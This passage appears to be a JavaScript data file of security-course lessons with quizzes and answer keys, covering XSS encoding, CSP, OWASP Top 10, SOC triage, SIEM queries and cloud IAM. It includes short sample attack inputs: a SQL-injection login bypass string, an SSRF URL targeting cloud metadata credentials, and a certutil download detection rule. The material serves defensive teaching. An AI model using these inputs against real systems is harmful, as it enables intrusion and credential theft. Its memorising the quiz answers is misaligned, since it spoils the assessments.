      explanation: 'Rate limiting restricts the number of login requests a client or IP can submit within a time window, preventing automated password guessing and credential stuffing.'
    },
    {
      title: 'Input Validation vs. Output Encoding',
      duration: '8 min',
      body: [
        'Defending web applications requires understanding the distinct roles of Input Validation and Contextual Output Encoding. While input validation ensures incoming data conforms to expected formats, output encoding is the definitive defense against Cross-Site Scripting (XSS).',
        'Input validation should occur on the server upon arrival, using strict whitelists. However, input validation alone cannot anticipate every context where data might be displayed (HTML body, HTML attributes, JavaScript blocks, URL parameters, or CSS).',
        'Contextual Output Encoding converts dangerous characters into safe, harmless representations for the target browser interpreter. For HTML body rendering, characters like `<`, `>`, `&`, `"`, and `\'` must be encoded into their corresponding HTML entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`). In modern frameworks like React and Vue, data bound inside templates is encoded automatically by default.'
      ],
      takeaway: 'Contextual output encoding neutralizes Cross-Site Scripting (XSS) by ensuring user data is treated as plain text, never executable HTML or script.',
      question: 'Which security control provides the primary, authoritative defense against Cross-Site Scripting (XSS) when rendering user-submitted text in HTML?',
      options: [
        'Context-aware Output Encoding (HTML entity encoding)',
        'HTTPS encryption',
        'Client-side JavaScript form validation',
        'Setting a strong Wi-Fi password'
      ],
      answer: 0,
      explanation: 'Contextual output encoding converts characters like `<` and `>` into harmless HTML entities (`&lt;`, `&gt;`), ensuring the browser parses them strictly as data rather than executable script tags.'
    },
    {
      title: 'Content Security Policy (CSP) Deployment',
      duration: '9 min',
      body: [
        'Content Security Policy (CSP) is an HTTP response header that restricts the resources (scripts, styles, images, iframes) that browsers are permitted to load for a given page. It acts as a powerful defense-in-depth layer against Cross-Site Scripting (XSS) and data exfiltration.',
        'A basic CSP header specifies directives: `Content-Security-Policy: default-src \'self\'; script-src \'self\' https://trustedscripts.com; object-src \'none\'; base-uri \'self\'`. This policy tells the browser to block scripts loaded from any origin other than the page itself and the trusted domain, while completely disabling dangerous plugins like Flash and Java applets.',
        'Modern CSP deployments use Cryptographic Nonces (`script-src \'nonce-rAnd0m123\'`). The server generates a unique, unguessable cryptographic nonce for every HTTP response and places it in both the header and the legitimate `<script nonce="rAnd0m123">` tag. Any injected attacker script lacks this secret per-request nonce and is instantly blocked by the browser.'
      ],
      takeaway: 'CSP restricts resource loading and script execution; nonce-based CSP prevents unauthorized inline scripts from executing even during an XSS injection.',
      question: 'What is a Cryptographic Nonce used for in a Content Security Policy (CSP) script-src directive?',
      options: [
        'It allows only scripts containing the exact matching random per-request nonce value to execute',
        'It encrypts the entire webpage with AES-256',
        'It increases the network download speed of images',
        'It tells the search engine crawler to index the page twice'
      ],
      answer: 0,
      explanation: 'A CSP nonce is a cryptographically random, single-use token generated per HTTP response; the browser only executes `<script>` tags that carry the exact matching nonce value, blocking injected attacker scripts.'
    }
  ],

  'course-owasp-top-10': [
    {
      title: 'Broken Access Control (A01)',
      duration: '9 min',
      body: [
        'Broken Access Control holds the #1 spot in the OWASP Top 10. Access control enforces policy such that users cannot act outside their intended permissions. When controls fail, unauthorized users can view, modify, or delete sensitive data, or take over administrator functionality.',
        'A widespread manifestation is Insecure Direct Object References (IDOR). An IDOR occurs when an application exposes a reference to an internal database object in a request (e.g., `GET /api/invoices/1042`), and the server fails to verify whether the requesting user owns invoice 1042 before returning the record. Simply incrementing the ID grants unauthorized access to all invoices.',
        'Access control must be enforced on the server for every single request. Never rely on client-side security (like hiding UI buttons). Best practices require role-based access control (RBAC) or attribute-based access control (ABAC) verified against session ownership: `if (invoice.userId !== session.userId) return 403 Forbidden`.'
      ],
      takeaway: 'Verify authorization on the server for every object reference; never assume that an authenticated user has rights to any arbitrary ID.',
      question: 'What vulnerability occurs when an API endpoint `GET /users/55/profile` allows User 12 to view User 55\'s private profile simply by changing the ID number?',
      options: [
        'Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)',
        'Cross-Site Scripting (XSS)',
        'SQL Injection',
        'Buffer Overflow'
      ],
      answer: 0,
      explanation: 'An IDOR / BOLA occurs when an application exposes direct database keys in parameters without validating that the authenticated user possesses authorization rights for that specific object.'
    },
    {
      title: 'Cryptographic Failures (A02)',
      duration: '8 min',
      body: [
        'Previously titled "Sensitive Data Exposure," Cryptographic Failures focus on flaws related to the improper protection of sensitive data in transit and at rest. This includes passwords, credit card numbers, health records, and corporate secrets.',
        'Common failures include: transmitting sensitive data over unencrypted HTTP, utilizing deprecated cryptographic protocols (TLS 1.0, TLS 1.1, SSLv3), employing weak or broken ciphers (RC4, DES, 3DES, MD5, SHA-1), hardcoding private cryptographic keys in source code, and improper key management.',
        'Remediation requires: enforcing TLS 1.3 with HSTS (`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`) to prevent SSL-stripping attacks, encrypting sensitive data at rest using AES-256-GCM with keys managed in dedicated Hardware Security Modules (HSM) or cloud KMS (Key Management Services), and hashing passwords with Argon2id.'
      ],
      takeaway: 'Enforce TLS 1.3 with HSTS for data in transit; use AES-256-GCM and cloud KMS for data at rest, eliminating hardcoded keys.',
      question: 'Which HTTP response header forces browsers to only communicate with a domain over encrypted HTTPS, preventing SSL-stripping downgrade attacks?',
      options: [
        'Strict-Transport-Security (HSTS)',
        'Content-Type: text/plain',
        'Access-Control-Allow-Origin',
        'X-Powered-By: PHP'
      ],
      answer: 0,
      explanation: 'HTTP Strict Transport Security (HSTS) informs the browser that the website must never be loaded over unencrypted HTTP, neutralizing SSL-stripping MitM attacks.'
    },
    {
      title: 'Injection Vulnerabilities: SQLi & Command Injection (A03)',
      duration: '9 min',
      body: [
        'Injection flaws occur when untrusted user data is sent to an interpreter (SQL engine, system shell, LDAP directory) as part of a command or query, tricking the interpreter into executing unintended instructions.',
        'SQL Injection (SQLi) occurs when user input is concatenated directly into SQL queries: `SELECT * FROM users WHERE user = \'` + input + `\'`. Supplying `admin\' OR \'1\'=\'1` alters the boolean logic, bypassing authentication. In UNION-based SQLi, attackers extract data from other database tables. In Blind SQLi, attackers extract data by measuring boolean true/false responses or time delays (`pg_sleep(5)`).',
        'The definitive defense against SQL injection is Parameterized Queries (Prepared Statements). In a prepared statement, the database compiles the SQL query structure first, treating user-supplied parameters strictly as literal data, completely neutralizing malicious SQL keywords. For shell commands, avoid calling shell interpreters (`exec()`, `system()`) with user input.'
      ],
      takeaway: 'Parameterized queries (Prepared Statements) separate code from data, completely neutralizing SQL injection attacks.',
      question: 'Why do Parameterized Prepared Statements effectively eliminate SQL Injection vulnerabilities?',
      options: [
        'The database pre-compiles the SQL command structure, ensuring parameter data is never parsed as executable SQL code',
        'They encrypt the database hard drive',
        'They delete all single quotation marks from the internet',
        'They force the user to solve a CAPTCHA'
      ],
      answer: 0,
      explanation: 'Prepared statements separate the query structure from the data parameters; the database engine treats user input strictly as literal values, rendering SQL injection syntax inert.'
    },
    {
      title: 'Insecure Design & Threat Modeling (A04)',
      duration: '8 min',
      body: [
        'Insecure Design represents architectural flaws that exist before any line of code is written. Unlike implementation bugs, design flaws cannot be fixed by perfect coding or automated vulnerability patching; the architecture itself lacks necessary security boundaries.',
        'Examples of insecure design include: an e-commerce platform that allows the client browser to submit the final product price in a form field, or a password reset flow that allows unlimited security question guesses. Even if written in 100% bug-free code, the design allows abuse.',
        'Mitigating insecure design requires Threat Modeling during the architecture phase. The STRIDE framework (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) identifies trust boundaries, threat actors, and required defensive controls before implementation begins.'
      ],
      takeaway: 'Insecure design cannot be patched with code fixes; threat modeling with STRIDE identifies architectural risks before coding starts.',
      question: 'Which threat modeling framework categorizes threats into Spoofing, Tampering, Repudiation, Information Disclosure, DoS, and Elevation of Privilege?',
      options: [
        'STRIDE',
        'DREAD',
        'CVSS',
        'MITRE'
      ],
      answer: 0,
      explanation: 'STRIDE is a mnemonic threat modeling framework created by Microsoft that systematically evaluates Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege.'
    },
    {
      title: 'Identification & Authentication Failures (A07)',
      duration: '8 min',
      body: [
        'Identification and Authentication Failures (formerly Broken Authentication) occur when functions related to user identity, session management, or credential verification are implemented insecurely, permitting automated credential stuffing, brute-forcing, or account takeover.',
        'Vulnerabilities include: permitting weak passwords (e.g., `Password123`), lacking protection against brute-force attacks, exposing session identifiers in URLs, failing to invalidate session tokens upon logout or password change, and insecure password recovery mechanisms.',
        'Defensive requirements include: implementing multi-factor authentication (MFA) across all user tiers, checking passwords against breach corpuses (e.g., HaveIBeenPwned API), implementing account lockout or exponential backoff, and using cryptographically secure session identifiers generated by proven frameworks.'
      ],
      takeaway: 'Prevent credential stuffing and authentication bypasses by enforcing MFA, checking breached password lists, and implementing session invalidation.',
      question: 'What authentication safeguard compares user passwords during registration against known breach databases to prevent users from selecting compromised passwords?',
      options: [
        'Breached Password Checking (e.g. HaveIBeenPwned API integration)',
        'MAC Address Filtering',
        'Port Scanning',
        'Subnetting'
      ],
      answer: 0,
      explanation: 'Integrating breached password verification checks candidate passwords against compromised credentials from public breaches, rejecting known dangerous passwords.'
    },
    {
      title: 'Server-Side Request Forgery (SSRF) (A10)',
      duration: '9 min',
      body: [
        'Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource (e.g., downloading an image from a user-supplied URL, processing webhooks, or fetching PDF previews) without validating the destination address, allowing an attacker to coerce the server into sending requests to arbitrary internal endpoints.',
        'In cloud environments (AWS, Azure, GCP), SSRF is devastating. An attacker supplies the cloud Instance Metadata Service (IMDS) IP: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The vulnerable backend server queries the link and returns temporary IAM access keys and security tokens to the attacker, leading to full cloud infrastructure compromise (as seen in the Capital One breach).',
        'Mitigating SSRF requires: using strict URL destination whitelists, disabling HTTP redirections, resolving DNS and verifying that the target IP does not fall into private RFC 1918 or link-local (`169.254.0.0/16`) ranges before connecting, and mandating IMDSv2 in AWS (requiring a session token via HTTP PUT, which simple SSRF cannot execute).'
      ],
      takeaway: 'SSRF coerces servers to probe internal networks and cloud metadata services (`169.254.169.254`); enforce IMDSv2 and block internal IP resolution.',
      question: 'What default link-local IP address do cloud servers query to access the Cloud Instance Metadata Service (IMDS) in AWS, Azure, and GCP?',
      options: [
        '169.254.169.254',
        '127.0.0.1',
        '192.168.1.1',
        '8.8.8.8'
      ],
      answer: 0,
      explanation: '169.254.169.254 is the standard link-local IP address used across major cloud providers to host the Instance Metadata Service (IMDS), providing access to instance identity and temporary IAM credentials.'
    }
  ],

  'course-soc-ops': [
    {
      title: 'Role of a Security Operations Center',
      duration: '8 min',
      body: [
        'A Security Operations Center (SOC) is the centralized organizational unit responsible for continuously monitoring, detecting, analyzing, and responding to cybersecurity incidents across an enterprise. Operating typically 24/7/365, a SOC combines skilled analysts, defensive processes, and security technology.',
        'The SOC hierarchy traditionally consists of three tiers: Tier 1 (Alert Triage Analysts: review incoming alerts, filter false positives, collect contextual logs, and escalate suspected incidents), Tier 2 (Incident Responders: perform deep-dive forensic analysis, scope compromise extent, and execute containment playbooks), and Tier 3 (Threat Hunters & Detection Engineers: proactively hunt for undetected threats and author advanced detection rules).',
        'SOC performance is evaluated using key metrics: Mean Time to Detect (MTTD, the duration between an initial compromise and detection) and Mean Time to Respond (MTTR, the duration from detection to containment and recovery). Lowering MTTD and MTTR limits adversary dwell time and reduces business damage.'
      ],
      takeaway: 'The SOC operates across Tier 1 (Triage), Tier 2 (Investigation), and Tier 3 (Hunting); reducing MTTD and MTTR limits attacker dwell time.',
      question: 'What does the SOC performance metric MTTD stand for, and why is minimizing it critical?',
      options: [
        'Mean Time to Detect; minimizing it reduces attacker dwell time before detection',
        'Maximum Time to Download; it measures file transfer speeds',
        'Motherboard Temperature Threshold Device; it monitors hardware heat',
        'Manual Testing and Training Division; it schedules employee reviews'
      ],
      answer: 0,
      explanation: 'Mean Time to Detect (MTTD) measures the average time elapsed from when an intrusion occurs until the security team detects it. Minimizing MTTD restricts attacker dwell time.'
    },
    {
      title: 'Alert Ingestion & Triage Playbooks',
      duration: '8 min',
      body: [
        'A busy enterprise SOC ingests millions of events per hour from endpoints (EDR), firewalls, proxies, cloud audit logs, and identity providers into a centralized SIEM. Security Information and Event Management (SIEM) correlation engines fire alerts when suspicious patterns match detection rules.',
        'Alert fatigue is a major operational risk: when analysts are inundated with thousands of noisy alerts, genuine critical breaches get missed. SOCs implement Standard Operating Procedures (SOPs) called Playbooks to standardize triage.',
        'A typical Phishing Triage Playbook directs the analyst through specific verification gates: 1. Extract email headers (DKIM, SPF, DMARC alignment); 2. Extract sender IP and check reputation (AbuseIPDB, VirusTotal); 3. Inspect URLs in an isolated sandbox for credential harvesting forms; 4. Search email gateway logs to identify all enterprise recipients; 5. Purge the malicious email globally and revoke credentials for users who clicked.'
      ],
      takeaway: 'Standardized SOC playbooks structure alert investigation, ensuring consistent, rapid verification while mitigating analyst alert fatigue.',
      question: 'What is the primary danger of "alert fatigue" in a Security Operations Center (SOC)?',
      options: [
        'Analysts become overwhelmed by high-volume false positives, causing critical real breach alerts to be overlooked',
        'The computer monitors run out of electrical power',
        'Firewall rules delete themselves automatically',
        'Email servers reject incoming messages'
      ],
      answer: 0,
      explanation: 'Alert fatigue occurs when high volumes of low-fidelity or noisy alerts exhaust analysts\' cognitive capacity, resulting in missed true-positive alerts during critical breaches.'
    },
    {
      title: 'False Positive Reduction Techniques',
      duration: '8 min',
      body: [
        'In SOC telemetry, every alert falls into a statistical classification matrix: True Positive (TP, an alert fired on genuine malicious activity), False Positive (FP, an alert fired on benign normal activity), True Negative (TN, normal activity correctly ignored), and False Negative (FN, malicious activity that evaded detection entirely).',
        'False Positives waste critical analyst time and degrade morale. Reducing false positives requires continuous Detection Tuning. SOC engineers refine detection queries by establishing contextual baselines and applying precise exception filters.',
        'For example, if an alert detects `certutil.exe` downloading external files (a common Living off the Land technique used by attackers to stage payloads), but legitimate IT administration scripts use it weekly to update corporate root certificates from an internal distribution server, the rule should be tuned with an allowlist restricting parent process, command-line arguments, and destination IP.'
      ],
      takeaway: 'Tuning detection rules with contextual whitelists and parent process baselines reduces false positives without blinding sensors to true threats.',
      question: 'In security alert triage, what term describes an alert triggered by legitimate, harmless administrative activity?',
      options: [
        'False Positive',
        'True Positive',
        'False Negative',
        'True Negative'
      ],
      answer: 0,
      explanation: 'A False Positive occurs when a security alert is generated by legitimate, benign user or administrative behavior that resembles malicious activity.'
    },
    {
      title: 'Multi-Source Log Correlation',
      duration: '9 min',
      body: [
        'An isolated log entry rarely reveals the full story of an attack. A single failed SSH login might be a mistyped password, but when correlated across multiple data sources, it exposes an orchestrated adversary campaign.',
        'Multi-Source Log Correlation stitches together telemetry from disparate systems using common pivot attributes: Timestamp, IP address, Username, and Hostname. For example: 1. Perimeter Firewall logs record inbound port 443 connection from an anomalous IP; 2. Web Server access logs record a POST request to `/upload.php` returning status 200; 3. EDR logs on the web server record `w3wp.exe` spawning `powershell.exe` executing an encoded command; 4. Active Directory logs record an Event 4624 logon from the web server to the Domain Controller.',
        'Correlating these four disparate sources transforms isolated noise into an irrefutable timeline of a web shell compromise and lateral movement, allowing responders to isolate all affected systems simultaneously.'
      ],
      takeaway: 'Correlating firewall, web server, EDR, and identity logs transforms isolated events into complete end-to-end attack timelines.',
      question: 'Which pivot identifiers are most commonly used by SOC analysts to correlate events across heterogeneous log sources in a SIEM?',
      options: [
        'Timestamp, IP Address, Username, and Hostname',
        'Monitor refresh rate and keyboard language',
        'Battery level and Wi-Fi signal strength',
        'CPU temperature and fan speed'
      ],
      answer: 0,
      explanation: 'Timestamps, source/destination IP addresses, authenticated usernames, and hostnames serve as universal correlation anchors connecting events across firewalls, endpoints, and servers.'
    },
    {
      title: 'Evidence Gathering & Escalation Notes',
      duration: '8 min',
      body: [
        'When a Tier 1 analyst confirms an alert is a True Positive indicating potential compromise, the incident must be escalated to Tier 2/3 and the Incident Commander. Thorough, accurate documentation is vital.',
        'Escalation notes must follow a structured format: 1. Executive Summary (one sentence summarizing the incident); 2. Indicators of Compromise (IOCs: malicious IPs, domains, file hashes, executed commands); 3. Scope of Impact (affected endpoints, user accounts, and business functions); 4. Timeline (chronological bullet points with UTC timestamps); 5. Immediate Containment Actions Taken (e.g., host network isolated, password revoked).',
        'Maintaining clean documentation and Chain of Custody preserves evidence integrity for potential legal proceedings, regulatory reporting (GDPR, SEC disclosures), and cyber insurance claims.'
      ],
      takeaway: 'Standardized escalation notes detailing UTC timelines, IOCs, affected assets, and containment actions ensure seamless handover to incident response teams.',
      question: 'Why must timestamps in security investigation escalation notes and forensic reports always be recorded in Coordinated Universal Time (UTC)?',
      options: [
        'To prevent confusion across disparate servers and global endpoints operating across different local timezones',
        'Because UTC is required by the computer hardware BIOS',
        'Because local time is encrypted and cannot be viewed in text editors',
        'To save hard drive storage space'
      ],
      answer: 0,
      explanation: 'Recording events in UTC establishes an unambiguous, synchronized timeline across servers, cloud providers, and global teams, eliminating errors caused by daylight saving and local timezone offsets.'
    },
    {
      title: 'Root Cause Determination',
      duration: '8 min',
      body: [
        'Remediating symptoms without uncovering the Root Cause leaves the organization vulnerable to immediate re-infection. If a SOC team wipes a compromised workstation without determining how the attacker gained access, the adversary will simply re-compromise the replacement system through the same unpatched vulnerability.',
        'Root Cause Analysis (RCA) applies investigative techniques (such as the "5 Whys" methodology) to trace an incident back to the initial entry vector: Was it a spear-phishing email with a malicious macro? An unpatched VPN gateway exposed to the internet? An API key leaked in a public GitHub repository? Or default credentials on an RDP port?',
        'Once the root cause is confirmed, strategic corrective actions are implemented: patching the specific software vulnerability, enforcing MFA, re-architecting firewall rules, or deploying new detection signatures to permanently close the initial access vector.'
      ],
      takeaway: 'Root Cause Analysis identifies the initial entry vector; remediating root causes prevents adversaries from immediately regaining footholds.',
      question: 'What is the danger of reimaging a compromised server without performing Root Cause Analysis (RCA)?',
      options: [
        'The underlying vulnerability remains open, allowing the attacker to re-compromise the system immediately',
        'The server operating system license is permanently cancelled',
        'The network switch will reject the server\'s MAC address',
        'The server fan speed will permanently run at maximum'
      ],
      answer: 0,
      explanation: 'Without identifying and fixing the initial entry point (e.g., unpatched software, weak credentials, or exposed API keys), an attacker can exploit the exact same vector to compromise the rebuilt server.'
    }
  ],

  'course-siem-tools': [
    {
      title: 'Log Forwarding & Ingestion Pipelines',
      duration: '8 min',
      body: [
        'A Security Information and Event Management (SIEM) system is only as good as the telemetry it ingests. Log forwarding architectures transport events from thousands of distributed servers, containers, network appliances, and workstations into a centralized pipeline.',
        'Protocols and agents govern forwarding: Syslog (RFC 5424 over UDP 514 or encrypted TLS 6514) collects network appliance and Linux logs; lightweight shippers like Elastic Beats (Winlogbeat for Windows Event logs, Filebeat for log files) and Fluentd/Logstash normalize and ship logs; and cloud native forwarders (AWS CloudWatch, Azure Event Hubs) stream cloud infrastructure events.',
        'Ingestion pipelines often utilize distributed message brokers like Apache Kafka as an ingestion buffer. Kafka absorbs sudden traffic spikes during massive network incidents or DDoS attacks, preventing data loss and allowing parsing clusters to ingest and index events reliably without crashing backend SIEM datastores.'
      ],
      takeaway: 'Lightweight log shippers (Winlogbeat, Filebeat) stream telemetry to message queues (Kafka) to ensure resilient, loss-free SIEM ingestion.',
      question: 'Why do enterprise SIEM architectures place distributed message queues like Apache Kafka in front of log ingestion clusters?',
      options: [
        'To buffer sudden traffic spikes and prevent event loss when indexing clusters are heavily loaded',
        'To decrypt all network passwords automatically',
        'To replace the need for endpoint antivirus',
        'To speed up CPU clock frequencies'
      ],
      answer: 0,
      explanation: 'Message queues buffer incoming log streams, ensuring that bursts of telemetry during major security events or system restarts do not overload or crash the SIEM indexers, preventing data loss.'
    },
    {
      title: 'Indexing, Normalization & Common Information Model',
      duration: '8 min',
      body: [
        'Raw log files come in hundreds of proprietary, incompatible formats: a Cisco firewall formats events differently than a Windows server, an Apache web server, or a Linux authentication log. Without normalization, searching for a single IP address across all systems would require authoring dozens of distinct query filters.',
        'Log Normalization parses unstructured text into structured key-value schemas adhering to a Common Information Model (such as the Elastic Common Schema - ECS, Splunk CIM, or the Open Cybersecurity Schema Framework - OCSF).',
        'Under a common schema, source IP addresses from all technologies are mapped to a standardized field name (e.g., `source.ip`). An analyst can then execute a single unified query: `source.ip: 198.51.100.23` and instantly retrieve firewall drops, web server requests, and authentication attempts matching that IP across the entire enterprise.'
      ],
      takeaway: 'Normalizing logs to a Common Information Model (ECS, CIM, OCSF) standardizes field names (e.g., `source.ip`), enabling cross-platform correlation.',
      question: 'What is the primary benefit of mapping heterogeneous log fields to a standard schema like Elastic Common Schema (ECS) or Splunk CIM?',
      options: [
        'It standardizes field names so a single query can search across firewalls, endpoints, and servers simultaneously',
        'It compresses log sizes to zero bytes',
        'It eliminates the need for software updates',
        'It converts text logs into video format'
      ],
      answer: 0,
      explanation: 'A Common Information Model maps proprietary vendor field names to unified standard keys (such as `source.ip` and `user.name`), allowing analysts to query all systems using identical search syntax.'
    },
    {
      title: 'Dashboard & Visualization Design',
      duration: '7 min',
      body: [
        'Dashboards synthesize millions of discrete log rows into actionable visual intelligence for SOC analysts and executives. Visualizations leverage aggregations, time-series graphs, heatmaps, and metric counters.',
        'Effective SOC dashboard design follows the principle of situational awareness. Key dashboard panes include: Authentication Anomalies (geographical heatmaps showing logins outside normal countries, spikes in Event 4625 failed logins), Network Outliers (top talkers by bandwidth, outbound connections on non-standard ports), and Endpoint Detections (top alert categories, high-risk host rankings).',
        'Dashboards must emphasize actionable deviations rather than vanity metrics. Designing dashboards with interactive drill-down capabilities allows an analyst to click a suspicious spike in an aggregation chart and immediately filter the underlying raw logs for rapid investigation.'
      ],
      takeaway: 'Effective dashboards emphasize anomaly baselines and interactive drill-downs rather than static vanity numbers.',
      question: 'What is an "interactive drill-down" feature on a SOC security dashboard?',
      options: [
        'Clicking an aggregation chart element to immediately filter and inspect the underlying raw log records',
        'Drilling holes into hard drives to dispose of classified data',
        'Running hardware diagnostic stress tests on servers',
        'Changing the dashboard color theme from dark mode to light mode'
      ],
      answer: 0,
      explanation: 'Interactive drill-down allows an analyst to click on an anomalous graph spike or table row to automatically apply filters and inspect the exact raw log events that generated that visual data point.'
    },
    {
      title: 'Writing Query Filters & Aggregations',
      duration: '8 min',
      body: [
        'SIEM query languages (such as Splunk SPL, Elasticsearch Lucene/KQL, Microsoft Sentinel KQL, and Google SecOps YARA-L) are the primary tools used by security analysts to extract threat indicators and perform investigations.',
        'Queries combine boolean logic (`AND`, `OR`, `NOT`), field-value matching (`event.code: 4688 AND process.name: "powershell.exe"`), wildcard matching, and time constraints. In KQL/SPL, pipe commands transform data: `where`, `summarize count() by user`, `sort by count desc`.',
        'Aggregations calculate statistical baselines. For example, to detect potential data exfiltration: aggregate total outbound network bytes per internal host over the last 24 hours, group by destination IP, and filter for hosts exceeding 3 standard deviations above the corporate average.'
      ],
      takeaway: 'Mastering query languages (SPL, KQL) and statistical aggregations enables analysts to isolate threat anomalies from massive log volumes.',
      question: 'In SIEM search queries, what operation groups log records by specific attributes and calculates statistics like sums, counts, and averages?',
      options: [
        'Aggregation / Summarization',
        'Encryption',
        'Decapsulation',
        'Subnetting'
      ],
      answer: 0,
      explanation: 'Aggregations (e.g. `summarize count() by user` or `stats count by src_ip`) group records together to calculate statistical totals, identifying outliers and frequency distributions.'
    },
    {
      title: 'Sigma Rule Structure & Translation',
      duration: '9 min',
      body: [
        'Historically, detection rules written for one SIEM (e.g., Splunk) could not be run on another (e.g., Elasticsearch or Sentinel) without manual rewriting. Sigma is the open, generic signature format for SIEM systems—the "Snort for Log Files."',
        'A Sigma rule is written in standardized YAML with defined fields: `title`, `id` (UUID), `status`, `description`, `logsource` (category, product, service: e.g., `windows/process_creation`), `detection` (defining selection criteria and condition logic: `selection: Image|endswith: \'\\certutil.exe\' AND CommandLine|contains: \'-urlcache\'`, `condition: selection`), and `level` (low, medium, high, critical).',
        'Using the `sigmac` compiler or modern `pySigma`, a single community Sigma rule translates automatically into native queries across 20+ SIEM platforms: Splunk SPL, Elastic KQL, Microsoft Sentinel KQL, QRadar, and Logscale, enabling rapid global sharing of detection engineering logic.'
      ],
      takeaway: 'Sigma rules standardize log detection logic in YAML, compiling into native queries for Splunk, Elastic, Sentinel, and QRadar.',
      question: 'What is the main benefit of authoring detection rules in the open-source Sigma YAML format?',
      options: [
        'A single Sigma rule compiles automatically into native query syntax for any major SIEM (Splunk, Elastic, Sentinel, etc.)',
        'Sigma rules eliminate the need to collect system logs',
        'Sigma rules make servers immune to zero-day exploits',
        'Sigma rules encrypt all network packets'
      ],
      answer: 0,
      explanation: 'Sigma provides a universal, vendor-agnostic YAML format that compiles directly into native target query languages for all leading SIEM platforms.'
    },
    {
      title: 'Alert Threshold Tuning & Validation',
      duration: '8 min',
      body: [
        'Deploying a detection rule into production without validation and threshold tuning leads to unmanageable alert storms or silent detection failures. Detection engineering requires rigorous testing before activating automated alerts.',
        'Threshold tuning sets realistic triggers. For instance, an alert for "Failed Logins" set at 3 failures might fire hundreds of times a day from forgetful employees; setting the threshold to "more than 10 failed logins within 60 seconds followed by 1 successful login" catches actual credential brute-forcing while ignoring benign human typing errors.',
        'Validation employs Atomic Red Team or automated breach and attack simulation (BAS) tools. Engineers execute controlled, atomic adversary techniques (e.g., running `whoami /priv` or staging a test file in `/tmp/`) in staging environments to verify that the pipeline ingests the event, matches the detection rule, and fires the alert within expected SLAs.'
      ],
      takeaway: 'Validate detection rules using atomic attack simulation tools (Atomic Red Team) to verify alerts fire accurately before production deployment.',
      question: 'What open-source framework provides simple, scripted test cases mapped to MITRE ATT&CK to validate that SIEM detection rules fire properly?',
      options: [
        'Atomic Red Team',
        'Wireshark',
        'VirtualBox',
        'John the Ripper'
      ],
      answer: 0,
      explanation: 'Atomic Red Team (by Red Canary) is a library of simple, automated scripted tests mapped to MITRE ATT&CK techniques, allowing defenders to validate detection pipelines safely.'
    }
  ],

  'course-cloud-sec': [
    {
      title: 'Shared Responsibility & Cloud Service Models',
      duration: '8 min',
      body: [
        'Security in cloud computing operates under the Shared Responsibility Model. Cloud service providers (CSPs: AWS, Azure, GCP) and customers divide responsibility depending on the service model: IaaS, PaaS, or SaaS.',
        'In Infrastructure as a Service (IaaS, e.g., EC2, Azure VMs, GCE): The CSP is responsible for "Security OF the Cloud" (physical data centers, host hardware, hypervisors, physical networking). The customer is responsible for "Security IN the Cloud" (guest operating system, patches, firewall rules, IAM, installed software, and data encryption).',
        'In Platform as a Service (PaaS, e.g., AWS Elastic Beanstalk, RDS): The CSP manages the OS and runtime; the customer manages application code and data. In Software as a Service (SaaS, e.g., Microsoft 365, Google Workspace): The CSP manages everything except customer data, user identities, and access policies. A critical cloud security mistake is assuming the cloud provider secures customer configurations by default.'
      ],
      takeaway: 'In IaaS, the customer is fully responsible for OS patching, firewall rules, and IAM configuration; the CSP only secures the physical infrastructure.',
      question: 'Under the Cloud Shared Responsibility Model for an AWS EC2 or Azure Virtual Machine (IaaS), who is responsible for applying operating system security patches?',
      options: [
        'The Customer',
        'The Cloud Service Provider (AWS/Azure)',
        'The Hardware Motherboard Manufacturer',
        'The Local Internet Service Provider'
      ],
      answer: 0,
      explanation: 'In IaaS models, the customer retains complete control and responsibility for managing the guest operating system, including installing security updates and patches.'
    },
    {
      title: 'IAM Roles, Policies, & Least Privilege',
      duration: '9 min',
      body: [
        'Identity and Access Management (IAM) is the perimeter of modern cloud computing. In the cloud, network perimeters dissolve; identity controls access to every API, database, and virtual machine.',
        'IAM structures permissions through JSON policies attached to Users, Groups, and Roles. The Principle of Least Privilege mandates that identities be granted ONLY the minimum permissions required to perform their specific job function, and nothing more.',
        'A critical best practice is adopting IAM Roles rather than hardcoding static Long-Term Access Keys (Access Key ID and Secret Access Key). When an application running on an EC2 instance or Lambda function requires S3 access, attaching an IAM Role allows AWS to deliver short-term, auto-rotating credentials via the instance metadata service, eliminating the risk of leaked permanent keys.'
      ],
      takeaway: 'Attach IAM Roles with temporary credentials to compute instances; avoid static long-term access keys and enforce least privilege in JSON policies.',
      question: 'Why is attaching IAM Roles to cloud compute instances vastly safer than embedding static Access Key ID and Secret Access Keys in application code?',
      options: [
        'IAM Roles provide temporary, auto-rotating credentials, eliminating the risk of permanent keys leaking from code repositories',
        'IAM Roles make network traffic run over fiber optics',
        'Static keys are illegal under cloud terms of service',
        'IAM Roles eliminate the need for billing accounts'
      ],
      answer: 0,
      explanation: 'IAM Roles dynamically generate temporary, short-lived STS credentials that rotate automatically, ensuring that compromised application code does not expose permanent cloud credentials.'
    },
    {
      title: 'Cloud Storage Bucket Permissions & Exposure',
      duration: '8 min',
      body: [
        'Cloud object storage services (AWS S3, Azure Blob Storage, Google Cloud Storage) store massive volumes of enterprise data, from database backups and application assets to confidential customer records. Misconfigured public storage buckets represent one of the most widespread causes of catastrophic data breaches.',
        'Storage access is governed by multiple overlapping controls: Bucket Policies (resource-based JSON policies), Access Control Lists (ACLs), and public access blocks. A common blunder occurs when administrators grant `s3:GetObject` to `Principal: "*"` or enable legacy "AllUsers" read permissions, exposing sensitive files to anyone with an internet connection.',
        'Cloud providers now provide global "Block Public Access" switches at both the bucket and account level. Best practices include enabling Block Public Access by default, requiring Server-Side Encryption (SSE-KMS) with Customer Managed Keys, enabling versioning and object locks to defend against ransomware, and monitoring access logs with automated anomaly detectors (e.g., AWS Macie).'
      ],
      takeaway: 'Enable account-wide Block Public Access and server-side KMS encryption on object storage buckets to prevent public data leaks.',
      question: 'Which AWS account-level security control acts as a centralized fail-safe to prevent any S3 bucket in an account from ever being made publicly accessible?',
      options: [
        'S3 Block Public Access',
        'VPC Peering',
        'Route 53 Hosted Zone',
        'Auto Scaling Group'
      ],
      answer: 0,
      explanation: 'S3 Block Public Access enforces account-wide and bucket-level settings that override all bucket policies and ACLs, blocking public read or write access completely.'
